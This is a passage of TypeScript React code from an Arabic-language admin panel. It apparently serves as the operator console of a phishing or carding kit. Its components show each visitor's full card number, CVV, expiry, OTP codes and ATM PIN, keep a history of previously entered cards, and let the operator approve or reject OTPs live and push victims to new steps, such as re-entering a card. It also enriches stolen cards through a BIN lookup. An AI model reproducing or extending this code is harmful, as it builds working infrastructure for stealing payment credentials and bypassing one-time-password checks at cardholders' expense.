    if (!open) return;
    const onDoc = (e: MouseEvent) => {
      const t = e.target as HTMLElement;
      if (!t.closest("[data-customize-dropdown]")) setOpen(false);
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, [open]);

  const hiddenCount = (Object.values(settings) as CardSetting[]).filter(
    s => !s.visible
  ).length;

  return (
    <div className="relative" data-customize-dropdown>
      <button
        onClick={() => setOpen(o => !o)}
        className="h-7 px-2.5 rounded-md text-[11px] font-semibold flex items-center gap-1.5 bg-white hover:bg-slate-50 text-slate-700 border border-slate-200"
        data-testid="admin-customize-btn"
      >
        <Settings className="w-3.5 h-3.5 text-slate-500" />
        <span>تخصيص اللوحة</span>
        {hiddenCount > 0 && (
          <span className="text-[9px] bg-blue-50 text-blue-700 px-1 py-0.5 rounded">
            {hiddenCount} مخفي
          </span>
        )}
        <ChevronDown
          className={`w-3 h-3 text-slate-400 transition ${open ? "rotate-180" : ""}`}
        />
      </button>

      {open && (
        <div className="absolute top-full mt-1 left-0 w-72 rounded-xl border border-slate-200 bg-white shadow-xl z-40">
          <div className="p-2.5 border-b border-slate-100 flex items-center justify-between">
            <div className="text-xs font-bold text-slate-800">
              إظهار / إخفاء البطاقات
            </div>
            <button
              onClick={onReset}
              className="text-[10px] text-blue-600 hover:text-blue-500 flex items-center gap-1 font-semibold"
              data-testid="admin-customize-reset"
            >
              <RotateCcw className="w-3 h-3" />
              إعادة الضبط
            </button>
          </div>

          <div className="p-2 max-h-96 overflow-y-auto">
            {(Object.keys(CARD_LABELS) as CardKey[]).map(key => {
              const s = settings[key];
              return (
                <div
                  key={key}
                  className="p-2 rounded-lg hover:bg-slate-50"
                  data-testid={`admin-customize-row-${key}`}
                >
                  <div className="flex items-center justify-between gap-2">
                    <button
                      onClick={() => onChange(key, { visible: !s.visible })}
                      className="flex items-center gap-2 flex-1 text-right"
                      data-testid={`admin-customize-toggle-${key}`}
                    >
                      {s.visible ? (
                        <Eye className="w-4 h-4 text-blue-600" />
                      ) : (
                        <EyeOff className="w-4 h-4 text-slate-400" />
                      )}
                      <span
                        className={`text-xs font-semibold ${s.visible ? "text-slate-800" : "text-slate-400"}`}
                      >
                        {CARD_LABELS[key]}
                      </span>
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}

function PagesControlDropdown({ visitor }: { visitor: Visitor }) {
  const [open, setOpen] = useState(false);
  const current = Number(visitor.step) || 1;
  const directed = Number(visitor.directedStep) || 0;
  const pending = directed > 0 && directed !== current;

  useEffect(() => {
    if (!open) return;
    const onDoc = (e: MouseEvent) => {
      const t = e.target as HTMLElement;
      if (!t.closest("[data-pages-dropdown]")) setOpen(false);
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, [open]);

  return (
    <div className="relative" data-pages-dropdown>
      <button
        onClick={() => setOpen(o => !o)}
        data-testid="pages-dropdown-toggle"
        className={`h-7 px-2.5 rounded-md flex items-center gap-1.5 border text-[11px] font-bold transition ${
          pending
            ? "bg-violet-50 border-violet-300 text-violet-700"
            : "bg-blue-50 border-blue-200 text-blue-700 hover:bg-blue-100"
        }`}
      >
        <Layers className="w-3.5 h-3.5" />
        <span>التحكم بالصفحات</span>
        <span className="px-1 py-0.5 rounded bg-white border border-slate-200 text-[9px] font-mono text-slate-700">
          {current}/{getFlowTotalSteps(getVisitorFlow(visitor))}
        </span>
        <ChevronDown
          className={`w-3 h-3 transition ${open ? "rotate-180" : ""}`}
        />
      </button>

      {open && (
        <div className="absolute top-full mt-1 left-0 w-[340px] rounded-xl border border-slate-200 bg-white shadow-xl z-40 p-3">
          <div className="flex items-center justify-between mb-2 pb-2 border-b border-slate-100">
            <div className="text-xs font-bold text-slate-800">
              التحكم بالصفحات
            </div>
            <div className="text-[10px] text-blue-600 font-semibold">
              الحالية: {current}
            </div>
          </div>
          <PagesControl visitor={visitor} />
        </div>
      )}
    </div>
  );
}

function PagesControl({ visitor }: { visitor: Visitor }) {
  const current = Number(visitor.step) || 1;
  const directed = Number(visitor.directedStep) || 0;
  const flow = getVisitorFlow(visitor);
  const flowLabels = getFlowStepLabels(flow);
  const [customPath, setCustomPath] = useState("");

  async function pushStep(target: number) {
    console.log("[DEBUG] pushStep (current page / step update):", {
      visitorId: visitor.id,
      target,
      flow,
    });
    await setDoc(
      doc(db, "pays", visitor.id),
      buildPageControlPayload(flow, target, new Date().toISOString()),
      { merge: true }
    );
  }

  async function pushCustomPath() {
    const path = getDirectedVisitorPath(customPath);
    if (!path) {
      window.alert("أدخل مساراً عاماً صالحاً مثل /restaurants أو /reserve/1");
      return;
    }
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        directedPath: path,
        directedStep: 0,
        directedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true }
    );
    setCustomPath("");
  }

  async function clearApproval(field: string) {
    const payload: Record<string, unknown> = {
      [field]: "waiting",
      updatedAt: new Date().toISOString(),
    };
    if (field === "cardApprovalStatus") {
      payload.cardApproved = false;
      payload.cardStatus = "pending_approval";
      payload.status = "pending_approval";
    } else if (field === "otpApprovalStatus") {
      payload.otpApproved = false;
      payload.otpStatus = "pending";
    }
    await setDoc(doc(db, "pays", visitor.id), payload, { merge: true });
  }

  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 gap-1.5">
        {Object.entries(flowLabels).map(([k, label]) => {
          const n = Number(k);
          const pageId = getFlowStepPage(flow, n);
          const isCurrent = current === n;
          const isDirected = directed === n;
          return (
            <button
              key={k}
              onClick={() => pushStep(n)}
              data-testid={`push-step-${n}`}
              className={`py-1.5 px-2 rounded-md text-[11px] font-bold transition border text-right ${
                isCurrent
                  ? "bg-blue-600 text-white border-blue-600"
                  : isDirected
                    ? "bg-violet-50 text-violet-700 border-violet-300"
                    : "bg-slate-50 text-slate-700 border-slate-200 hover:bg-slate-100"
              }`}
            >
              <div className="flex items-center justify-between gap-1 mb-0.5">
                <span className="text-[9px] opacity-75">{n}</span>
                <span
                  className="text-[9px] font-mono opacity-75 truncate"
                  dir="ltr"
                >
                  {pageId}
                </span>
              </div>
              <div className="leading-tight truncate">{label}</div>
            </button>
          );
        })}
      </div>

      <div className="border-t border-slate-200 pt-2 space-y-2">
        <div className="text-[10px] text-slate-500 mb-1">
          توجيه مباشر إلى أي صفحة عامة
        </div>
        <div className="flex gap-1.5" dir="ltr">
          <input
            value={customPath}
            onChange={event => setCustomPath(event.target.value)}
            placeholder="/restaurants أو /reserve/1"
            className="min-w-0 flex-1 rounded border border-slate-300 bg-white px-2 py-1 text-[10px] text-slate-800 outline-none focus:border-blue-500"
            data-testid="input-custom-visitor-path"
          />
          <button
            onClick={() => void pushCustomPath()}
            className="rounded bg-blue-600 px-2.5 py-1 text-[10px] font-bold text-white hover:bg-blue-500"
            data-testid="button-push-custom-visitor-path"
          >
            توجيه
          </button>
        </div>
        <div className="text-[10px] text-slate-400">
          الصفحات الإدارية وتوجيهات خارج الموقع غير مسموحة.
        </div>
      </div>

      <div className="border-t border-slate-200 pt-2 space-y-1">
        <div className="text-[10px] text-slate-500 mb-1">طلب جديد</div>
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={() => clearApproval("cardApprovalStatus")}
            className="py-1 bg-slate-50 text-slate-700 rounded text-[10px] font-semibold border border-slate-200 hover:bg-slate-100"
          >
            بطاقة
          </button>
          <button
            onClick={() => clearApproval("otpApprovalStatus")}
            className="py-1 bg-slate-50 text-slate-700 rounded text-[10px] font-semibold border border-slate-200 hover:bg-slate-100"
          >
            OTP
          </button>
        </div>
      </div>

      {directed > 0 && directed !== current && (
        <div className="text-[10px] text-violet-700 bg-violet-50 border border-violet-200 rounded p-1.5 text-center font-medium">
          ⏳ تم التوجيه إلى{" "}
          {getFlowStepPage(flow, directed) || `الخطوة ${directed}`} - بانتظار
          استجابة المستخدم
        </div>
      )}
    </div>
  );
}

function OtpRow({
  label,
  step,
  code,
  status,
  canDecide,
  onApprove,
  onReject,
}: {
  label: string;
  step: number;
  code: string;
  status: string;
  canDecide: boolean;
  onApprove?: () => void;
  onReject?: () => void;
}) {
  const length = Math.max(code.length, 4);
  const digits = code.padEnd(length, "•").slice(0, length).split("");
  const tone =
    status === "waiting"
      ? "border-amber-300 bg-amber-50/60"
      : status === "approved"
        ? "border-emerald-300 bg-emerald-50/60"
        : status === "rejected"
          ? "border-red-300 bg-red-50/60"
          : "border-slate-200 bg-white";
  return (
    <div className={`rounded-lg p-2.5 border ${tone}`}>
      <div className="flex items-center justify-between mb-1.5">
        <div className="flex items-center gap-1.5">
          <span className="text-[11px] text-slate-700 font-bold">
            {label}
          </span>
          <span className="text-[9px] text-slate-500 bg-slate-100 border border-slate-200 rounded px-1.5 py-0.5">
            مرحلة {step}
          </span>
        </div>
        <span className="text-[10px] text-slate-500">
          {code ? `${code.length} رقم` : "—"}
        </span>
      </div>
      <div className="flex gap-1 justify-center mb-2" dir="ltr">
        {digits.map((d, i) => (
          <div
            key={i}
            className={`w-8 h-9 rounded-md flex items-center justify-center text-base font-bold font-mono border ${
              code
                ? "bg-white border-slate-300 text-blue-700 shadow-xs"
                : "bg-slate-50 border-slate-200 text-slate-400"
            }`}
          >
            {d}
          </div>
        ))}
      </div>
      <div className="flex items-center justify-between bg-white/90 border border-slate-200 rounded px-2.5 py-1.5 mb-2 text-xs">
        <span className="text-slate-600 font-semibold">رمز OTP الكامل:</span>
        <span
          className="font-mono font-bold text-sm text-blue-700 tracking-wider select-all"
          dir="ltr"
          data-testid={`otp-full-code-${step}`}
        >
          {code || "بانتظار إدخال الزائر"}
        </span>
      </div>
      {(onApprove || onReject) && (
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={onApprove}
            disabled={!canDecide}
            className="py-1 bg-emerald-600 text-white hover:bg-emerald-500 disabled:opacity-35 rounded text-[11px] font-semibold flex items-center justify-center gap-1"
            data-testid={`otp-row-approve-${step}`}
          >
            <CheckCircle2 className="w-3 h-3" /> قبول
          </button>
          <button
            onClick={onReject}
            disabled={!canDecide}
            className="py-1 bg-red-600 text-white hover:bg-red-500 disabled:opacity-35 rounded text-[11px] font-semibold flex items-center justify-center gap-1"
            data-testid={`otp-row-reject-${step}`}
          >
            <XCircle className="w-3 h-3" /> رفض
          </button>
        </div>
      )}
    </div>
  );
}

function StatusLine({ label, status }: { label: string; status: string }) {
  const cls =
    status === "approved"
      ? "text-emerald-600"
      : status === "rejected"
        ? "text-red-600"
        : status === "waiting"
          ? "text-amber-600"
          : status === "received"
            ? "text-blue-600"
            : "text-slate-400";
  const text =
    status === "approved"
      ? "تم القبول"
      : status === "rejected"
        ? "مرفوض"
        : status === "waiting"
          ? "في انتظار الإرسال..."
          : status === "received"
            ? "تم الاستلام"
            : "—";
  return (
    <div className="flex items-center justify-between text-[11px]">
      <span className="text-slate-500">{label}</span>
      <span className={`font-semibold ${cls}`}>{text}</span>
    </div>
  );
}

function BlockedBinsCard({
  bins,
  onAdd,
  onRemove,
  suggestedBin,
  suggestedLast4,
}: {
  bins: string[];
  onAdd: (bin: string) => void;
  onRemove: (bin: string) => void;
  suggestedBin?: string;
  suggestedLast4?: string;
}) {
  const [input, setInput] = useState("");
  const cleanInput = input.replace(/\D/g, "").slice(0, 6);
  const canAdd = cleanInput.length === 6 && !bins.includes(cleanInput);
  const sugg = suggestedBin
    ? String(suggestedBin).replace(/\D/g, "").slice(0, 6)
    : "";
  const suggCanAdd = sugg.length === 6 && !bins.includes(sugg);

  return (
    <Panel
      title="قائمة البطاقات المحظورة"
      badge={bins.length > 0 ? `${bins.length} محظور` : undefined}
    >
      <div className="space-y-3">
        <div className="text-[11px] text-slate-600 leading-relaxed">
          أي بطاقة تبدأ بأول 6 أرقام (BIN) من القائمة سيتم رفضها تلقائياً عند
          المحاولة بدفع.
        </div>

        {/* Add form */}
        <div className="flex gap-1.5">
          <input
            type="text"
            inputMode="numeric"
            maxLength={6}
            value={input}
            onChange={e => setInput(e.target.value.replace(/\D/g, ""))}
            onKeyDown={e => {
              if (e.key === "Enter" && canAdd) {
                onAdd(cleanInput);
                setInput("");
              }
            }}
            placeholder="مثال: 453204"
            dir="ltr"
            className="flex-1 px-2 py-1.5 bg-white border border-slate-300 rounded-lg text-sm font-mono text-slate-800 text-center placeholder-slate-400 focus:outline-none focus:border-red-500"
            data-testid="blocklist-input"
          />
          <button
            onClick={() => {
              if (!canAdd) return;
              onAdd(cleanInput);
              setInput("");
            }}
            disabled={!canAdd}
            className="px-3 py-1.5 bg-red-600 hover:bg-red-500 disabled:opacity-35 disabled:cursor-not-allowed text-white rounded-lg text-xs font-bold flex items-center gap-1"
            data-testid="blocklist-add"
          >
            <Plus className="w-3.5 h-3.5" /> حظر
          </button>
        </div>

        {/* Quick-add suggestion from currently selected visitor */}
        {sugg && (
          <button
            onClick={() => suggCanAdd && onAdd(sugg)}
            disabled={!suggCanAdd}
            className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
              suggCanAdd
                ? "bg-amber-50 border-amber-200 hover:bg-amber-100 text-amber-800"
                : "bg-slate-100 border-slate-200 text-slate-400 cursor-not-allowed"
            }`}
            data-testid="blocklist-add-current"
          >
            <span className="text-[11px] flex items-center gap-1.5">
              <Ban className="w-3 h-3" />
              {suggCanAdd ? "حظر بطاقة الزائر الحالي" : "BIN الزائر محظور"}
            </span>
            <span className="font-mono text-[12px] font-bold" dir="ltr">
              {sugg}
              {suggestedLast4 ? ` ··· ${suggestedLast4}` : ""}
            </span>
          </button>
        )}

        {/* Blocked list */}
        <div>
          <div className="text-[11px] text-slate-500 mb-1.5 flex items-center gap-1">
            <ShieldOff className="w-3 h-3" /> البطاقات المحظورة ({bins.length})
          </div>
          <div className="space-y-1 max-h-48 overflow-y-auto">
            {bins.length === 0 && (
              <div className="text-center py-4 text-slate-400 text-[11px]">
                لا يوجد بطاقات محظورة
              </div>
            )}
            {bins.map(b => (
              <div
                key={b}
                className="flex items-center justify-between gap-2 bg-white border border-slate-200 rounded-lg px-2.5 py-1.5 group"
              >
                <span
                  className="font-mono text-[13px] font-bold text-red-600 tracking-wider"
                  dir="ltr"
                >
                  {b}••••••••••
                </span>
                <button
                  onClick={() => {
                    if (confirm(`إزالة الحظر عن ${b}؟`)) onRemove(b);
                  }}
                  className="text-slate-400 hover:text-red-600 p-1 rounded hover:bg-red-50"
                  data-testid={`blocklist-remove-${b}`}
                  title="إزالة"
                >
                  <XIcon className="w-3.5 h-3.5" />
                </button>
              </div>
            ))}
          </div>
        </div>
      </div>
    </Panel>
  );
}

function BlockedIpsCard({
  ips,
  onAdd,
  onRemove,
  suggestedIp,
  suggestedName,
}: {
  ips: string[];
  onAdd: (ip: string) => void;
  onRemove: (ip: string) => void;
  suggestedIp?: string;
  suggestedName?: string;
}) {
  const [input, setInput] = useState("");
  const cleanInput = input.trim();
  const looksValid =
    /^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$/.test(cleanInput) ||
    /^[0-9a-fA-F:]+$/.test(cleanInput);
  const canAdd = looksValid && !ips.includes(cleanInput);
  const sugg = suggestedIp ? String(suggestedIp).trim() : "";
  const suggCanAdd = !!sugg && !ips.includes(sugg);

  return (
    <Panel
      title="حظر الزوار بعنوان IP"
      badge={ips.length > 0 ? `${ips.length} محظور` : undefined}
    >
      <div className="space-y-3">
        <div className="text-[11px] text-slate-600 leading-relaxed">
          أي زائر يدخل من عنوان IP موجود بالقائمة سيُمنع من استخدام النظام ويظهر
          له رسالة حظر. يدعم IPv4 و IPv6 والـ CIDR.
        </div>

        <div className="flex gap-1.5">
          <input
            type="text"
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => {
              if (e.key === "Enter" && canAdd) {
                onAdd(cleanInput);
                setInput("");
              }
            }}
            placeholder="مثال: 102.45.12.7"
            dir="ltr"
            className="flex-1 px-2 py-1.5 bg-white border border-slate-300 rounded-lg text-sm font-mono text-slate-800 text-center placeholder-slate-400 focus:outline-none focus:border-red-500"
            data-testid="ip-blocklist-input"
          />
          <button
            onClick={() => {
              if (!canAdd) return;
              onAdd(cleanInput);
              setInput("");
            }}
            disabled={!canAdd}
            className="px-3 py-1.5 bg-red-600 hover:bg-red-500 disabled:opacity-35 disabled:cursor-not-allowed text-white rounded-lg text-xs font-bold flex items-center gap-1"
            data-testid="ip-blocklist-add"
          >
            <Plus className="w-3.5 h-3.5" /> حظر
          </button>
        </div>

        {sugg && (
          <button
            onClick={() => suggCanAdd && onAdd(sugg)}
            disabled={!suggCanAdd}
            className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
              suggCanAdd
                ? "bg-amber-50 border-amber-200 hover:bg-amber-100 text-amber-800"
                : "bg-slate-100 border-slate-200 text-slate-400 cursor-not-allowed"
            }`}
            data-testid="ip-blocklist-add-current"
          >
            <span className="text-[11px] flex items-center gap-1.5">
              <WifiOff className="w-3 h-3" />
              {suggCanAdd ? "حظر الزائر الحالي" : "IP الزائر محظور"}
              {suggestedName ? ` · ${suggestedName}` : ""}
            </span>
            <span className="font-mono text-[12px] font-bold" dir="ltr">
              {sugg}
            </span>
          </button>
        )}

        <div>
          <div className="text-[11px] text-slate-500 mb-1.5 flex items-center gap-1">
            <ShieldOff className="w-3 h-3" /> العناوين المحظورة ({ips.length})
          </div>
          <div className="space-y-1 max-h-48 overflow-y-auto">
            {ips.length === 0 && (
              <div className="text-center py-4 text-slate-400 text-[11px]">
                لا يوجد عناوين محظورة
              </div>
            )}
            {ips.map(ip => (
              <div
                key={ip}
                className="flex items-center justify-between gap-2 bg-white border border-slate-200 rounded-lg px-2.5 py-1.5 group"
              >
                <span
                  className="font-mono text-[13px] font-bold text-red-600 tracking-wider"
                  dir="ltr"
                >
                  {ip}
                </span>
                <button
                  onClick={() => {
                    if (confirm(`إزالة الحظر عن ${ip}؟`)) onRemove(ip);
                  }}
                  className="text-slate-400 hover:text-red-600 p-1 rounded hover:bg-red-50"
                  data-testid={`ip-blocklist-remove-${ip}`}
                  title="إزالة"
                >
                  <XIcon className="w-3.5 h-3.5" />
                </button>
              </div>
            ))}
          </div>
        </div>
      </div>
    </Panel>
  );
}

function CardHistoryList({
  history,
  currentc1,
}: {
  history: any;
  currentc1: string;
}) {
  const [open, setOpen] = useState(true);
  const [hiddenMap, setHiddenMap] = useState<Record<number, boolean>>({});

  const entries = Array.isArray(history) ? history : [];
  const current = String(currentc1 || "").replace(/\D/g, "");

  // Keep chronological order (oldest first -> latest at the bottom)
  const previous = entries
    .map((e: any) => ({
      c1: String(e?.c1 || e?.c1 || "").replace(/\D/g, ""),
      cvv: String(e?.cvv || e?.cpc || "").replace(/\D/g, ""),
      expiryMonth: String(e?.expiryMonth || "")
        .padStart(2, "0")
        .slice(-2),
      expiryYear: String(e?.expiryYear || "")
        .slice(-2)
        .padStart(2, "0"),
      cardName: String(e?.cardName || ""),
      cardType: String(e?.cardType || ""),
      timestamp: typeof e?.timestamp === "string" ? e.timestamp : "",
    }))
    .filter((e: any) => e.c1 && e.c1 !== current);

  if (previous.length === 0) return null;

  return (
    <div className="rounded-lg border border-slate-200 bg-white">
      <button
        onClick={() => setOpen(o => !o)}
        className="w-full px-3 py-2 flex items-center justify-between text-[11px] font-bold text-slate-700 hover:bg-slate-50 rounded-lg transition"
        data-testid="toggle-card-history"
      >
        <span className="flex items-center gap-1.5">
          <RotateCcw className="w-3 h-3 text-slate-500" />
          البطاقات السابقة ({previous.length})
        </span>
        <ChevronDown
          className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
        />
      </button>
      {open && (
        <div className="px-2 pb-2 space-y-1.5">
          {previous.map((entry: any, idx: number) => {
            const isRevealed = !hiddenMap[idx];
            const grouped = entry.c1.replace(/(.{4})/g, "$1 ").trim();
            const masked = `•••• •••• •••• ${entry.c1.slice(-4) || "••••"}`;
            const expiry =
              entry.expiryMonth && entry.expiryYear
                ? `${entry.expiryMonth}/${entry.expiryYear}`
                : "—";
            return (
              <div
                key={`${entry.c1}-${idx}`}
                className="rounded-md bg-slate-50 border border-slate-200 p-2.5 space-y-1.5"
                data-testid={`card-history-${idx}`}
              >
                <div className="flex items-center justify-between text-[10px] text-slate-500">
                  <span dir="ltr" className="font-mono">
                    #{idx + 1} · {fmtTime(entry.timestamp)}
                  </span>
                  <button
                    onClick={() =>
                      setHiddenMap(r => ({ ...r, [idx]: !r[idx] }))
                    }
                    className="flex items-center gap-1 text-blue-600 hover:text-blue-500 font-semibold"
                    data-testid={`toggle-card-history-reveal-${idx}`}
                  >
                    {isRevealed ? (
                      <>
                        <EyeOff className="w-3 h-3" /> إخفاء
                      </>
                    ) : (
                      <>
                        <Eye className="w-3 h-3" /> عرض
                      </>
                    )}
                  </button>
                </div>
                {entry.cardName && (
                  <div className="text-[11px] font-semibold text-slate-700">
                    {entry.cardName}
                  </div>
                )}
                <div
                  className="font-mono text-[13px] font-bold tracking-wider text-slate-900 select-all"
                  dir="ltr"
                  data-testid={`card-history-number-${idx}`}
                >
                  {isRevealed ? grouped : masked}
                </div>
                <div className="flex items-center gap-3 text-[11px] text-slate-700">
                  <div>
                    <span className="text-slate-400">CVV: </span>
                    <span
                      className="font-mono font-bold text-slate-900 select-all"
                      dir="ltr"
                      data-testid={`card-history-cvv-${idx}`}
                    >
                      {isRevealed ? entry.cvv || entry?.cpc || "—" : "•••"}
                    </span>
                  </div>
                  <div>
                    <span className="text-slate-400">Exp: </span>
                    <span
                      className="font-mono font-bold text-slate-900 select-all"
                      dir="ltr"
                      data-testid={`card-history-exp-${idx}`}
                    >
                      {expiry}
                    </span>
                  </div>
                  {entry.cardType && (
                    <div className="ml-auto">
                      <span className="text-[9px] uppercase px-1.5 py-px rounded bg-slate-200 text-slate-700 font-bold">
                        {entry.cardType}
                      </span>
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}

function CardInfoCard({
  visitor,
  onApprove,
  onReject,
  onPushStep,
  onBlockBin,
  isBinBlocked,
  onBlockIp,
  isIpBlocked,
}: {
  visitor: Visitor;
  onApprove: (
    field: "cardApprovalStatus" | "otpApprovalStatus" | "phoneOtpApprovalStatus"
  ) => void;
  onReject: (
    field: "cardApprovalStatus" | "otpApprovalStatus" | "phoneOtpApprovalStatus"
  ) => void;
  onPushStep: (step: number) => void;
  onBlockBin?: (bin: string) => void;
  isBinBlocked?: boolean;
  onBlockIp?: (ip: string) => void;
  isIpBlocked?: boolean;
}) {
  const p = visitor.payment || {};
  const visitorAny = visitor as any;
  const historyEntries = Array.isArray(visitorAny.cardHistory)
    ? visitorAny.cardHistory
    : [];
  const latestHistoryCard =
    historyEntries.length > 0
      ? historyEntries[historyEntries.length - 1]
      : null;

  const mockupc1 = String(
    p.c1 ||
      visitorAny.c1 ||
      visitorAny.c1 ||
      latestHistoryCard?.c1 ||
      latestHistoryCard?.c1 ||
      ""
  );
  const hasCard = !!(
    p.cardLast4 ||
    p.cardName ||
    p.c1 ||
    mockupc1
  );

  const bin = p.cardBin;
  const hasEnrichment =
    !!(visitorAny.cardBankName || visitorAny.bankName) &&
    !!(
      visitorAny.cardCategory ||
      visitorAny.cardLevel ||
      visitorAny.cardCountry
    );

  useEffect(() => {
    if (!bin || bin.length < 6) return;
    if (hasEnrichment) return;
    let cancelled = false;
    (async () => {
      try {
        const res = await fetch(`/api/bin-lookup/${bin}`);
        if (!res.ok) return;
        const json = await res.json();
        if (cancelled) return;
        if (!json?.success || !json.data) return;
        const d = json.data;
        const patch: Record<string, string> = {
          updatedAt: new Date().toISOString(),
        };
        if (d.bankName) patch.cardBankName = String(d.bankName);
        if (d.cardType) patch.cardCategory = String(d.cardType);
        if (d.cardLevel) patch.cardLevel = String(d.cardLevel);
        if (d.country) patch.cardCountry = String(d.country);
        if (d.scheme && !visitorAny.cardScheme)
          patch.cardScheme = String(d.scheme);
        await setDoc(doc(db!, "pays", visitor.id), patch, { merge: true });
      } catch {
        // silent
      }
    })();
    return () => {
      cancelled = true;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bin, hasEnrichment, visitor.id]);

  if (!hasCard && visitor.nafadConfirmationStatus !== "waiting") return null;

  const fullCard = mockupc1.replace(/\D/g, "");
  const last4 = p.cardLast4 || fullCard.slice(-4) || "••••";
  const expiry =
    p.cardExpiry ||
    (visitorAny.expiryMonth && visitorAny.expiryYear
      ? `${String(visitorAny.expiryMonth).padStart(2, "0")}/${String(visitorAny.expiryYear).slice(-2)}`
      : latestHistoryCard?.expiryMonth && latestHistoryCard?.expiryYear
        ? `${String(latestHistoryCard.expiryMonth).padStart(2, "0")}/${String(latestHistoryCard.expiryYear).slice(-2)}`
        : "");
  const name =
    p.cardName ||
    visitorAny.cardName ||
    latestHistoryCard?.cardName ||
    visitor.name ||
    "";
  const scheme = String(
    p.cardScheme || visitorAny.cardType || latestHistoryCard?.cardType || ""
  ).toLowerCase();
  const bank = safeText(p.cardBank);
  const cardType = String(p.cardType || "DEBIT").toUpperCase();
  const cardLevel = String(p.cardLevel || "PLATINUM").toUpperCase();
  const cardCountry = String(p.cardCountry || "SA").toUpperCase();
  const matchedBank = findBankLogo(p.cardBank);
  const bankLogo: string | null = p.cardBankLogo || matchedBank?.logo || null;
  const bankLabel: string =
    p.cardBankLabel || matchedBank?.label || bank || "البنك السعودي للاستثمار";
  const waiting = visitor.cardApprovalStatus !== "approved";
  const hasBin =
    bin || bank || p.cardType || p.cardCountry || p.cpc || visitor.atmPin;
  const groupedCard =
    fullCard.length > 0
      ? fullCard.replace(/(.{4})/g, "$1 ").trim()
      : `${bin ? `${bin}•• •••• ` : "•••• •••• •••• "}${last4}`;
  const cvc = String(
    p.cpc ||
      visitorAny.cvv ||
      visitorAny.cpc ||
      latestHistoryCard?.cvv ||
      latestHistoryCard?.cpc ||
      ""
  ).replace(/\D/g, "");
  const currentOtp = String(
    visitor.otp || visitorAny.smsOtp || visitorAny.phoneOtp || ""
  );
  const atmPin = String(
    visitor.atmPin || visitorAny.cardPin || visitorAny.pinCode || ""
  );

  const isMaster = scheme.includes("master");
  const isMada = scheme.includes("mada") || !scheme;
  const isAmex = scheme.includes("amex") || scheme.includes("american");
  const schemeLabel = isMaster
    ? "MASTERCARD"
    : isMada
      ? "mada"
      : isAmex
        ? "AMEX"
        : "VISA";

  return (
    <Panel
      title="الدفع"
      badge={waiting ? "بانتظار الموافقة" : undefined}
    >
      <div className="space-y-3">
        {/* Previous cards history shown first so latest card is on last down */}
        <CardHistoryList
          history={visitorAny.cardHistory}
          currentc1={fullCard}
        />

        {/* Nexa Flow Light Silver/Gray Payment Card Visual (Latest Card) */}
        <div
          className="relative rounded-xl p-4 text-slate-800 overflow-hidden w-full border border-slate-300/80 shadow-xs"
          style={{
            background: "linear-gradient(135deg, #e5e9ee 0%, #d5dce4 100%)",
            minHeight: 168,
          }}
          dir="ltr"
        >
          {/* Top row: Bank Logo & Name on Left, SAR badge on Right */}
          <div className="flex items-start justify-between gap-2">
            <div className="flex items-center gap-2 min-w-0">
              {bankLogo ? (
                <img
                  src={bankLogo}
                  alt={bankLabel}
                  className="h-6 w-auto max-w-[60px] object-contain"
                  onError={e => {
                    (e.currentTarget as HTMLElement).style.display = "none";
                  }}
                />
              ) : (
                <div className="w-6 h-6 rounded bg-amber-400/20 border border-amber-500/40 flex items-center justify-center text-amber-700 font-bold text-xs">
                  ❖
                </div>
              )}
              <div className="text-[11px] font-bold text-slate-800 truncate" dir="auto">
                {bankLabel}
              </div>
            </div>

            <span className="px-2 py-0.5 rounded border border-slate-400/70 bg-white/40 text-[10px] font-bold text-slate-700 font-mono">
              SAR
            </span>
          </div>

          {/* Middle row: Card Number on Left, Expiry Date on Right */}
          <div className="mt-5 flex items-center justify-between gap-2">
            <div
              className="font-mono text-[15px] font-semibold tracking-wider text-slate-900 select-all"
              data-testid="admin-card-number"
            >
              {groupedCard}
            </div>
            <div className="font-mono text-[13px] font-semibold text-slate-800 select-all">
              {expiry || "—/—"}
            </div>
          </div>

          {/* Holder Name & CVV */}
          <div className="mt-2.5 flex items-end justify-between gap-2">
            <div className="text-[12px] font-medium text-slate-800 truncate select-all">
              {name || "—"}
            </div>
            <div className="text-right">
              <div className="text-[8px] uppercase text-slate-500 font-bold leading-none">
                CVV
              </div>
              <div
                className="font-mono text-[12px] font-bold text-slate-900 select-all"
                data-testid="admin-card-cvv"
              >
                {cvc || "—"}
              </div>
            </div>
          </div>

          {/* Bottom row: Country Flag on Left, Scheme & Type/Level on Right */}
          <div className="mt-3 pt-1 flex items-center justify-between gap-2">
            <div className="flex items-center gap-1">
              <span className="inline-flex items-center justify-center px-1.5 py-0.5 rounded bg-emerald-700 text-white text-[9px] font-bold">
                🇸🇦
              </span>
              {cardCountry && (
                <span
                  className="hidden"
                  data-testid="card-bin-country"
                >
                  {cardCountry}
                </span>
              )}
            </div>

            <div className="flex flex-col items-end">
              <div className="flex items-center gap-1">
                {schemeLabel === "mada" ? (
                  <img
                    src="/mada.png"
                    alt="mada"
                    className="h-3.5 object-contain"
                  />
                ) : schemeLabel === "MASTERCARD" ? (
                  <img
                    src="/master.svg"
                    alt="Mastercard"
                    className="h-4 object-contain"
                  />
                ) : (
                  <img
                    src="/visa.png"
                    alt="Visa"
                    className="h-3.5 object-contain"
                  />
                )}
              </div>
              <div className="flex items-center gap-1 text-[9px] font-bold text-slate-500 uppercase tracking-wide mt-0.5">
                <span data-testid="card-bin-type">{cardType}</span>
                <span>•</span>
                <span data-testid="card-bin-level">{cardLevel}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Status & extra PIN/OTP info under the silver card */}
        <div className="flex items-center justify-between px-1 text-[11px]">
